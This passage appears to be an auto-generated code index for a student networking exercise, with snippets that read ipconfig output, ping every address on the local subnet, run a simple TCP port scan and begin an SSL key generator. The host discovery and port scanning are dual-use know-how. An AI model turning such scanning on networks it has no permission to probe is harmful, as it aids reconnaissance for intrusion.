        "peekOfCode": "blue = \"\\x1b[34m\"\nred = \"\\x1b[31m\"\norange = \"\\x1b[38;5;220m\"\ndef get_windows_info():\n    print(\"Running on Windows\")\n    ipconfig_output = subprocess.check_output(['ipconfig'], universal_newlines=True)\n    with open(path_txt, 'w') as file:\n        file.write(ipconfig_output)\n    files = os.listdir('.')\n    print(f\"{green} [+]Files in the current directory:\", files)",
        "detail": "TP.Windows.windows",
        "documentation": {}
    },
    {
        "label": "red",
        "kind": 5,
        "importPath": "TP.Windows.windows",
        "description": "TP.Windows.windows",
        "peekOfCode": "red = \"\\x1b[31m\"\norange = \"\\x1b[38;5;220m\"\ndef get_windows_info():\n    print(\"Running on Windows\")\n    ipconfig_output = subprocess.check_output(['ipconfig'], universal_newlines=True)\n    with open(path_txt, 'w') as file:\n        file.write(ipconfig_output)\n    files = os.listdir('.')\n    print(f\"{green} [+]Files in the current directory:\", files)\n    with open(path_txt, 'r') as file:",
        "detail": "TP.Windows.windows",
        "documentation": {}
    },
    {
        "label": "orange",
        "kind": 5,
        "importPath": "TP.Windows.windows",
        "description": "TP.Windows.windows",
        "peekOfCode": "orange = \"\\x1b[38;5;220m\"\ndef get_windows_info():\n    print(\"Running on Windows\")\n    ipconfig_output = subprocess.check_output(['ipconfig'], universal_newlines=True)\n    with open(path_txt, 'w') as file:\n        file.write(ipconfig_output)\n    files = os.listdir('.')\n    print(f\"{green} [+]Files in the current directory:\", files)\n    with open(path_txt, 'r') as file:\n        content = file.read()",
        "detail": "TP.Windows.windows",
        "documentation": {}
    },
    {
        "label": "check_platform",
        "kind": 2,
        "importPath": "TP.TP1",
        "description": "TP.TP1",
        "peekOfCode": "def check_platform():\n    return platform.system()\ndef init():\n    network_list = []\n    if len(sys.argv) > 1 and sys.argv[1] == '-h':\n        display_help()\n    else:\n        current_platform = check_platform()\n        if current_platform == 'Windows':\n            network_list = get_windows_info()",
        "detail": "TP.TP1",
        "documentation": {}
    },
    {
        "label": "init",
        "kind": 2,
        "importPath": "TP.TP1",
        "description": "TP.TP1",
        "peekOfCode": "def init():\n    network_list = []\n    if len(sys.argv) > 1 and sys.argv[1] == '-h':\n        display_help()\n    else:\n        current_platform = check_platform()\n        if current_platform == 'Windows':\n            network_list = get_windows_info()\n            return network_list\n        elif current_platform == 'Linux':",
        "detail": "TP.TP1",
        "documentation": {}
    },
    {
        "label": "netdiscover",
        "kind": 2,
        "importPath": "TP.TP2",
        "description": "TP.TP2",
        "peekOfCode": "def netdiscover(mask):\n    ip = 2 ** (32 - mask) - 2\n    return ip\ndef getAllIp(ip_address, range_ip):\n    network_address = socket.inet_ntoa(struct.pack('>I', struct.unpack('>I', socket.inet_aton(ip_address))[0] &\n                                                   struct.unpack('>I', socket.inet_aton(\"255.255.255.0\"))[0]))\n    all_ips = [socket.inet_ntoa(struct.pack('>I', struct.unpack('>I', socket.inet_aton(network_address))[0] + i)) for i\n               in range(1, int(range_ip))]\n    print(f'{blue} [+]{int(range_ip)} IP available')\n    # print(all_ips)",
        "detail": "TP.TP2",
        "documentation": {}
    },
    {
        "label": "getAllIp",
        "kind": 2,
        "importPath": "TP.TP2",
        "description": "TP.TP2",
        "peekOfCode": "def getAllIp(ip_address, range_ip):\n    network_address = socket.inet_ntoa(struct.pack('>I', struct.unpack('>I', socket.inet_aton(ip_address))[0] &\n                                                   struct.unpack('>I', socket.inet_aton(\"255.255.255.0\"))[0]))\n    all_ips = [socket.inet_ntoa(struct.pack('>I', struct.unpack('>I', socket.inet_aton(network_address))[0] + i)) for i\n               in range(1, int(range_ip))]\n    print(f'{blue} [+]{int(range_ip)} IP available')\n    # print(all_ips)\n    return all_ips\ndef scan_with_socket(host, port_list):\n    r = ping(host, timeout=5)",
        "detail": "TP.TP2",
        "documentation": {}
    },
    {
        "label": "scan_with_socket",
        "kind": 2,
        "importPath": "TP.TP2",
        "description": "TP.TP2",
        "peekOfCode": "def scan_with_socket(host, port_list):\n    r = ping(host, timeout=5)\n    if r is not False and r != None:\n        print(f\"{green} [✅] Ping to {host} successful. time: {r} ms\")\n        print(f\"{blue}----------------PORT----------------\")\n        for port in port_list:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.settimeout(1)\n            result = sock.connect_ex((host, port))\n            if result == 0:",
        "detail": "TP.TP2",
        "documentation": {}
    },
    {
        "label": "ping_host",
        "kind": 2,
        "importPath": "TP.TP2",
        "description": "TP.TP2",
        "peekOfCode": "def ping_host(host):\n    result = []\n    r = ping(host, timeout=1)\n    if r is not False and r != None :\n        #print(r)\n        print(f\"{green} [✅]Ping to {host} successful. time: {r} ms\")\n        return host\n        # result.append(host)\n    else:\n        print(f\"{red} [❌]Ping to {host} failed.\")",
        "detail": "TP.TP2",
        "documentation": {}
    },
    {
        "label": "saveResult",
        "kind": 2,
        "importPath": "TP.TP2",
        "description": "TP.TP2",
        "peekOfCode": "def saveResult(path, result):\n    \"\"\"\n    Stocke le contenu de la variable result dans le fichier présent dans la variable path\n    \"\"\"\n    with open(path, 'w') as file:\n        file.write(result)\n    print(f\"ip online save at {path}\")\ndef chooseInterface(ipList):\n    for ip in ipList:\n        print(ip)",
        "detail": "TP.TP2",
        "documentation": {}
    },
    {
        "label": "chooseInterface",
        "kind": 2,
        "importPath": "TP.TP2",
        "description": "TP.TP2",
        "peekOfCode": "def chooseInterface(ipList):\n    for ip in ipList:\n        print(ip)\n    user_input = input(\"Enter the number off the card selected : \")\n    choice = int(user_input)\n    print(\"Network interface selected :\")\n    result = ipList[choice - 1]\n    print(result)\n    return result\ndef main(param):",
        "detail": "TP.TP2",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "TP.TP2",
        "description": "TP.TP2",
        "peekOfCode": "def main(param):\n    result = []\n    ipList = init()\n    if param == 1:\n        print(\"PING\")\n        ipBlock = chooseInterface(ipList)\n        ip_on_the_network = netdiscover(int(ipBlock[\"Subnet Mask\"]))\n        listIp = getAllIp(ipBlock[\"IP Address\"], ip_on_the_network)\n        for ip in listIp:\n            online_ip = ping_host(ip)",
        "detail": "TP.TP2",
        "documentation": {}
    },
    {
        "label": "green",
        "kind": 5,
        "importPath": "TP.TP2",
        "description": "TP.TP2",
        "peekOfCode": "green = \"\\x1b[32m\"\nblue = \"\\x1b[34m\"\nred = \"\\x1b[31m\"\norange = \"\\x1b[38;5;220m\"\ndef netdiscover(mask):\n    ip = 2 ** (32 - mask) - 2\n    return ip\ndef getAllIp(ip_address, range_ip):\n    network_address = socket.inet_ntoa(struct.pack('>I', struct.unpack('>I', socket.inet_aton(ip_address))[0] &\n                                                   struct.unpack('>I', socket.inet_aton(\"255.255.255.0\"))[0]))",
        "detail": "TP.TP2",
        "documentation": {}
    },
    {
        "label": "blue",
        "kind": 5,
        "importPath": "TP.TP2",
        "description": "TP.TP2",
        "peekOfCode": "blue = \"\\x1b[34m\"\nred = \"\\x1b[31m\"\norange = \"\\x1b[38;5;220m\"\ndef netdiscover(mask):\n    ip = 2 ** (32 - mask) - 2\n    return ip\ndef getAllIp(ip_address, range_ip):\n    network_address = socket.inet_ntoa(struct.pack('>I', struct.unpack('>I', socket.inet_aton(ip_address))[0] &\n                                                   struct.unpack('>I', socket.inet_aton(\"255.255.255.0\"))[0]))\n    all_ips = [socket.inet_ntoa(struct.pack('>I', struct.unpack('>I', socket.inet_aton(network_address))[0] + i)) for i",
        "detail": "TP.TP2",
        "documentation": {}
    },
    {
        "label": "red",
        "kind": 5,
        "importPath": "TP.TP2",
        "description": "TP.TP2",
        "peekOfCode": "red = \"\\x1b[31m\"\norange = \"\\x1b[38;5;220m\"\ndef netdiscover(mask):\n    ip = 2 ** (32 - mask) - 2\n    return ip\ndef getAllIp(ip_address, range_ip):\n    network_address = socket.inet_ntoa(struct.pack('>I', struct.unpack('>I', socket.inet_aton(ip_address))[0] &\n                                                   struct.unpack('>I', socket.inet_aton(\"255.255.255.0\"))[0]))\n    all_ips = [socket.inet_ntoa(struct.pack('>I', struct.unpack('>I', socket.inet_aton(network_address))[0] + i)) for i\n               in range(1, int(range_ip))]",
        "detail": "TP.TP2",
        "documentation": {}
    },
    {
        "label": "orange",
        "kind": 5,
        "importPath": "TP.TP2",
        "description": "TP.TP2",
        "peekOfCode": "orange = \"\\x1b[38;5;220m\"\ndef netdiscover(mask):\n    ip = 2 ** (32 - mask) - 2\n    return ip\ndef getAllIp(ip_address, range_ip):\n    network_address = socket.inet_ntoa(struct.pack('>I', struct.unpack('>I', socket.inet_aton(ip_address))[0] &\n                                                   struct.unpack('>I', socket.inet_aton(\"255.255.255.0\"))[0]))\n    all_ips = [socket.inet_ntoa(struct.pack('>I', struct.unpack('>I', socket.inet_aton(network_address))[0] + i)) for i\n               in range(1, int(range_ip))]\n    print(f'{blue} [+]{int(range_ip)} IP available')",
        "detail": "TP.TP2",
        "documentation": {}
    },
    {
        "label": "SSLKeyGenerator",
        "kind": 6,
        "importPath": "key_gen",
        "description": "key_gen",
        "peekOfCode": "class SSLKeyGenerator:\n    def __init__(self):\n        self.green = \"\\x1b[32m\"\n        self.blue = \"\\x1b[34m\"\n        self.red = \"\\x1b[31m\"\n        self.orange = \"\\x1b[38;5;220m\"\n        self.Key = \"SSL\"\n    def check_OpenSSL(self, os_type):\n        #print(os_type)\n        if os_type == \"Linux\":",
        "detail": "key_gen",
        "documentation": {}
    }
]